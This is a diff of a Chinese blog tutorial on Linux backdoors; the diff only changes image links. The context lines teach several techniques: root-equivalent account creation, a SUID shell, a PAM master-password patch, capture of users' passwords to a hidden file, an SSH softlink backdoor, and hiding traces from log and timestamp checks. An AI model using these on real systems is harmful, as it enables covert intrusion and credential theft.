@@ -4,7 +4,7 @@ date: 2022-4-2 23:35:57
 tags: [Backdoor,Linux,Kali]
 categories: 
  - [CyberSecurity,后门]
-cover: https://res.cloudinary.com/sycamore/image/upload/v1682441841/Typera/2023/04/7e00f34b8462535fcbd72b5a18b714e9.png
+cover: https://res.cloudinary.com/sycamore/image/upload/v1792085354/Typora/2023/04/7e00f34b8462535fcbd72b5a18b714e9.png
 ---
 
 :::primary
@@ -31,18 +31,18 @@ cover: https://res.cloudinary.com/sycamore/image/upload/v1682441841/Typera/2023/
 
 #### 实现：
 输入命令：
-![image-20230426005018227](https://res.cloudinary.com/sycamore/image/upload/v1682441422/Typera/2023/04/a0f37b7036c0a7b07b57165d34510dc9.png)
+![image-20230426005018227](https://res.cloudinary.com/sycamore/image/upload/v1792085392/Typora/2023/04/a0f37b7036c0a7b07b57165d34510dc9.png)
 （增加超级用户backdoor）
 然后通过ssh登录backdoor账户：
-![image-20230426005025313](https://res.cloudinary.com/sycamore/image/upload/v1682441429/Typera/2023/04/a74b221974a59bbf958dea2d1d49823f.png)
+![image-20230426005025313](https://res.cloudinary.com/sycamore/image/upload/v1792085391/Typora/2023/04/a74b221974a59bbf958dea2d1d49823f.png)
 可以看到已经是root权限了：
-![image-20230426005032317](https://res.cloudinary.com/sycamore/image/upload/v1682441436/Typera/2023/04/2523b36be81cd6a668b416a6bbf6ca66.png)
+![image-20230426005032317](https://res.cloudinary.com/sycamore/image/upload/v1792085388/Typora/2023/04/2523b36be81cd6a668b416a6bbf6ca66.png)
 
 原理：给服务器增加一个**ID为0**的账号（因为**root**的ID为0）
 我们可以通过`vim /etc/passwd`命令打开passwd，所有用户名称与ID的对应关系都保存在这里。
 在文件开头，能看到root:
-![image-20230426005041049](https://res.cloudinary.com/sycamore/image/upload/v1682441444/Typera/2023/04/8c6aa69ccdebdd7b75bfaddbc6d434d4.png)在文件的最后，我们能够找到刚刚添加的账号（backdoor）
-![image-20230426005048939](https://res.cloudinary.com/sycamore/image/upload/v1682441452/Typera/2023/04/198980bd4423bb1cd26fcb757cbea990.png)已禁止uid=0用户远程登陆
+![image-20230426005041049](https://res.cloudinary.com/sycamore/image/upload/v1792085388/Typora/2023/04/8c6aa69ccdebdd7b75bfaddbc6d434d4.png)在文件的最后，我们能够找到刚刚添加的账号（backdoor）
+![image-20230426005048939](https://res.cloudinary.com/sycamore/image/upload/v1792085556/Typora/2023/04/198980bd4423bb1cd26fcb757cbea990.png)已禁止uid=0用户远程登陆
 
 管理员可以**禁止root用户**通过**ssh**的方式，远程登录服务器。
 
@@ -50,9 +50,9 @@ cover: https://res.cloudinary.com/sycamore/image/upload/v1682441841/Typera/2023/
 （首先保证拥有一个普通用户，否则禁用之后就无法远程登陆了）
 `vim /etc/ssh/sshd_config`打开 sshd_config 文件
 找到 `PermitRootLogin`，改为 no
-![image-20230426005055500](https://res.cloudinary.com/sycamore/image/upload/v1682441458/Typera/2023/04/fd0d61d6e7b7879eb2ea1d5f0de03dd5.png)然后重启ssh服务
+![image-20230426005055500](https://res.cloudinary.com/sycamore/image/upload/v1792085385/Typora/2023/04/fd0d61d6e7b7879eb2ea1d5f0de03dd5.png)然后重启ssh服务
 此时再通过 xshell 远程登录root账户，就会被拒绝：
-![image-20230426005101801](https://res.cloudinary.com/sycamore/image/upload/v1682441465/Typera/2023/04/d70b4faf22b9b537f1bbe6bb7f20d1f3.png)
+![image-20230426005101801](https://res.cloudinary.com/sycamore/image/upload/v1792085385/Typora/2023/04/d70b4faf22b9b537f1bbe6bb7f20d1f3.png)
 
 如果遇到了禁用uid=0账户远程登录的情况，也可以增加一个**普通用户**：
 `echo "用户名:x:1000:1000::/:/bin/sh" >> /etc/passwd`
@@ -78,7 +78,7 @@ linux 在 passwd 中存储了用户的信息，但是 passwd 文件允许**所�
 因此 Linux 将密码信息**单独存放**到 shadow 文件中。shadow **只有 root 用户**拥有读权限，其他用户**没有任何权限**，从而保证用户密码的安全性。
 
 但是，如果获得shadow文件**（/etc/shadow）**，你会看到里面的密码是这样的：
-![image-20230426005115328](https://res.cloudinary.com/sycamore/image/upload/v1682441478/Typera/2023/04/ee471def5fbcc8ec8666e76bd4403e8d.png)当然是密码的hash值，不会让你直接看到的密码的明文
+![image-20230426005115328](https://res.cloudinary.com/sycamore/image/upload/v1792085379/Typora/2023/04/ee471def5fbcc8ec8666e76bd4403e8d.png)当然是密码的hash值，不会让你直接看到的密码的明文
 
 但是，对于那些薄弱的密码，我们可以通过 **John the Ripper** 弱口令扫描工具（Kali 自带）进行破解。使用方法如下
 
@@ -106,7 +106,7 @@ root下执行命令：
 对于这种情况，需要使用这个命令运行：`/.shell -p`，这样在远程下也能获得 root 的 shell 了>
 
 ### 实现
-![image-20230426005121969](https://res.cloudinary.com/sycamore/image/upload/v1682441485/Typera/2023/04/7f3bd66ffe0223053f8eec312efe1e52.png)
+![image-20230426005121969](https://res.cloudinary.com/sycamore/image/upload/v1792085392/Typora/2023/04/7f3bd66ffe0223053f8eec312efe1e52.png)
 whoami 为 root
 
 ## PAM后门
@@ -142,7 +142,7 @@ PAM使用目录**/etc/pam.d/**下的配置文件，即对应着不同的认证�
 修改解压目录下的`/modules/pam_unix/pam_unix_auth.c`文件：
 第173行下加入：`if (strcmp(p,"密码")==0) {return PAM_SUCCESS;}`
 
-![image-20230426005137550](https://res.cloudinary.com/sycamore/image/upload/v1682441501/Typera/2023/04/34fdc632b2e79b17065c6ee808b2095f.png)
+![image-20230426005137550](https://res.cloudinary.com/sycamore/image/upload/v1792085375/Typora/2023/04/34fdc632b2e79b17065c6ee808b2095f.png)
 
 很简单的代码：当输入的 p 和我们设定的 "密码" 相同的时候，返回直接验证成功。
 
@@ -168,24 +168,24 @@ make
 （注意登录的需要是已有账户）`ssh 已有账户名@192.168.158.128`
 用自定义的 **hello** 密码，登录 root 成功：
 
-![image-20230426005144666](https://res.cloudinary.com/sycamore/image/upload/v1682441509/Typera/2023/04/8fa2af1fefbe5dab45f472a0e29e89b9.png)
+![image-20230426005144666](https://res.cloudinary.com/sycamore/image/upload/v1792085376/Typora/2023/04/8fa2af1fefbe5dab45f472a0e29e89b9.png)
 
 **不足&优化：**
 
 - 若是管理员**查看登录日志**：
-实时查看最后10条 `tail -f -n 10 /var/log/auth.log`（视具体情况不同，日志也有可能是/var/log/secure）![image-20230426005149260](https://res.cloudinary.com/sycamore/image/upload/v1682441513/Typera/2023/04/69c6d32a187e72672948a797b8239c8a.png)
+实时查看最后10条 `tail -f -n 10 /var/log/auth.log`（视具体情况不同，日志也有可能是/var/log/secure）![image-20230426005149260](https://res.cloudinary.com/sycamore/image/upload/v1792085376/Typora/2023/04/69c6d32a187e72672948a797b8239c8a.png)
 第一条是从 ssh 输入**正确密码**登录的日志，第二条是输入**自定义的密码**登陆的日志，
 可以看到，第二条会比第一条多出一行记录，**报告验证失败**，
-这是因为，在我们添加语句的前一行，先使用了 **_unix_verify_password** 函数进行了验证：![image-20230426005201757](https://res.cloudinary.com/sycamore/image/upload/v1682441525/Typera/2023/04/36756d8cdaf5be17fc933eb923916d51.png)
+这是因为，在我们添加语句的前一行，先使用了 **_unix_verify_password** 函数进行了验证：![image-20230426005201757](https://res.cloudinary.com/sycamore/image/upload/v1792085376/Typora/2023/04/36756d8cdaf5be17fc933eb923916d51.png)
 既然如此，我们可以找到函数 _unix_verify_password 的**位置**，在它验证之前，插入之前的那行代码，这样就能够**避免验证密码报错**。
-更改文件的路径为 Linux-PAM-1.4.0/modules/pam_unix/support.c，如下图：![image-20230426005205935](https://res.cloudinary.com/sycamore/image/upload/v1682441530/Typera/2023/04/206c7138eeede30e24a10e586daa7fcc.png)
-重新编译覆盖之后，ssh远程登录，查看日志：![image-20230426005213331](https://res.cloudinary.com/sycamore/image/upload/v1682441538/Typera/2023/04/0a3b87fb36dbc9ad01b198b4b7497f9a.png)
+更改文件的路径为 Linux-PAM-1.4.0/modules/pam_unix/support.c，如下图：![image-20230426005205935](https://res.cloudinary.com/sycamore/image/upload/v1792085368/Typora/2023/04/206c7138eeede30e24a10e586daa7fcc.png)
+重新编译覆盖之后，ssh远程登录，查看日志：![image-20230426005213331](https://res.cloudinary.com/sycamore/image/upload/v1792085368/Typora/2023/04/0a3b87fb36dbc9ad01b198b4b7497f9a.png)
 可以看到，第三条就和第一条一样了。
 <br>
 - 若是管理员查看**文件修改的时间**：
 可以用 touch -r 命令修改新文件的时间：
 `touch pam_unix.so -r /tmp/pam_unix.so.bak`（改为备份文件的时间）
-修改前后用`stat pam_unix.so*`命令查看结果如下所示：![image-20230426005217672](https://res.cloudinary.com/sycamore/image/upload/v1682441542/Typera/2023/04/63ec0bad9935885af21524b174d934d7.png)
+修改前后用`stat pam_unix.so*`命令查看结果如下所示：![image-20230426005217672](https://res.cloudinary.com/sycamore/image/upload/v1792085367/Typora/2023/04/63ec0bad9935885af21524b174d934d7.png)
 （仅更改了两项，可能还是会被管理员察觉，但是通过 -t 可以设定档案的时间记录)
 
 <br>
@@ -193,12 +193,12 @@ make
 
 同样修改解压目录下的`/modules/pam_unix/pam_unix_auth.c`文件：
 在第173行下加入，如下图所示：
-![image-20230426005222756](https://res.cloudinary.com/sycamore/image/upload/v1682441547/Typera/2023/04/e0996c17577375def40744fabaf69c5e.png)
+![image-20230426005222756](https://res.cloudinary.com/sycamore/image/upload/v1792085367/Typora/2023/04/e0996c17577375def40744fabaf69c5e.png)
 每次有用户登录的时候，将用户名 name 和密码 p 保存在 /tmp/.record_pwd 文件中
 
 保存 -> 编译 -> 覆盖 -> 从ssh用正常密码登录几次账号，提供记录的数据 -> 查看保存的文件：
 `cat /tmp/.record_pwd`
-![image-20230426005227686](https://res.cloudinary.com/sycamore/image/upload/v1682441550/Typera/2023/04/c09d43ce405bdb94fdbbc667420539ad.png)
+![image-20230426005227686](https://res.cloudinary.com/sycamore/image/upload/v1792085365/Typora/2023/04/c09d43ce405bdb94fdbbc667420539ad.png)
 
 ## SSH软连接后门
 **前提**：
@@ -224,15 +224,15 @@ make
 这条命令，先是使用 ln 强制(-f)创建，路径为`/usr/sbin/sshd`文件的软连接(-s)，并保存为`/usr/local/su`文件（**路径随意**、**文件名可变**），然后把 su 文件（sshd）连到指定的端口
 
 其中，创建的软连接名字虽然可变，但是也**不能随便命名**。可用的名字可以通过命令：`find /etc/pam.d|xargs grep "pam_rootok"`查看：
-![image-20230426005233857](https://res.cloudinary.com/sycamore/image/upload/v1682441558/Typera/2023/04/fc163d487f4169876de475b8ddda580f.png)
+![image-20230426005233857](https://res.cloudinary.com/sycamore/image/upload/v1792085364/Typora/2023/04/fc163d487f4169876de475b8ddda580f.png)
 
 
 ### 实现：
-![image-20230426005237555](https://res.cloudinary.com/sycamore/image/upload/v1682441561/Typera/2023/04/ca4d722ad8a618c1764639e0467bfd32.png)
+![image-20230426005237555](https://res.cloudinary.com/sycamore/image/upload/v1792085364/Typora/2023/04/ca4d722ad8a618c1764639e0467bfd32.png)
 
 这时候就能从2333端口，用root身份登入了（`ssh root@192.168.158.128 -p 2333`）：
 这里使用 cmd 演示：
-![](https://res.cloudinary.com/sycamore/image/upload/v1682441566/Typera/2023/04/b10b4b1d4b022009231a95b178468b94.png)
+![](https://res.cloudinary.com/sycamore/image/upload/v1792085364/Typora/2023/04/b10b4b1d4b022009231a95b178468b94.png)
 
 
 
@@ -250,14 +250,14 @@ echo "
  session    include      system-auth " >> /etc/pam.d/已有的用户名
 ```
 现在可以看到，在`/etc/pam.d/`文件夹下出现了一个，以你设定的用户名为名的配置文件（这里为**kali**）：
-![image-20230426005247027](https://res.cloudinary.com/sycamore/image/upload/v1682441571/Typera/2023/04/2ac6a6a91723dcd035e8e9a5163dfc92.png)
+![image-20230426005247027](https://res.cloudinary.com/sycamore/image/upload/v1792085361/Typora/2023/04/2ac6a6a91723dcd035e8e9a5163dfc92.png)
 
 现在再执行`find /etc/pam.d|xargs grep "pam_rootok"`命令查找，可以看到，可用的名字已经多了一个**kali**了：
-![image-20230426005254226](https://res.cloudinary.com/sycamore/image/upload/v1682441578/Typera/2023/04/1083edad21219c631ebbe5a28ceaba4f.png)
+![image-20230426005254226](https://res.cloudinary.com/sycamore/image/upload/v1792085361/Typora/2023/04/1083edad21219c631ebbe5a28ceaba4f.png)
 现在再使用命令：`ln -sf /usr/sbin/sshd /usr/local/kali;/usr/local/kali -oPort=端口号`创建软链接，就能达到普通用户免密登陆的效果
 
 **实现：**
-![image-20230426005258790](https://res.cloudinary.com/sycamore/image/upload/v1682441582/Typera/2023/04/4b19889af9d0e88eadf9e812f25d2cd0.png)
+![image-20230426005258790](https://res.cloudinary.com/sycamore/image/upload/v1792085358/Typora/2023/04/4b19889af9d0e88eadf9e812f25d2cd0.png)
 
 
-![image-20230426005304178](https://res.cloudinary.com/sycamore/image/upload/v1682441588/Typera/2023/04/e00aa90c6fe6c5fda03c942cf6a9fd29.png)
+![image-20230426005304178](https://res.cloudinary.com/sycamore/image/upload/v1792085361/Typora/2023/04/e00aa90c6fe6c5fda03c942cf6a9fd29.png)
